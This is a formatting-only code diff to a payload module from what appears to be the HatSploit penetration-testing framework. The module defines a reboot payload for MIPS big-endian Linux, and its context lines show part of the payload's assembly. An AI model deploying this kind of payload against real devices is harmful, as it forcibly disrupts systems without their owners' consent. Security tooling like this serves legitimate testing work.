@@ -13,14 +13,12 @@ class HatSploitPayload(Payload, Assembler):
     details = {
         'Name': "Linux mipsbe Reboot",
         'Payload': "linux/mipsbe/reboot",
-        'Authors': [
-            'Ivan Nikolsky (enty8080) - payload developer'
-        ],
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
         'Description': "Reboot payload for Linux mipsbe.",
         'Architecture': "mipsbe",
         'Platform': "linux",
         'Rank': "low",
-        'Type': "one_side"
+        'Type': "one_side",
     }
 
     def run(self):
@@ -36,5 +34,5 @@ class HatSploitPayload(Payload, Assembler):
                 ori $a0, $a0, 0xdead
                 addiu $v0, $zero, 0xff8
                 syscall 0x40404
-            """
+            """,
         )
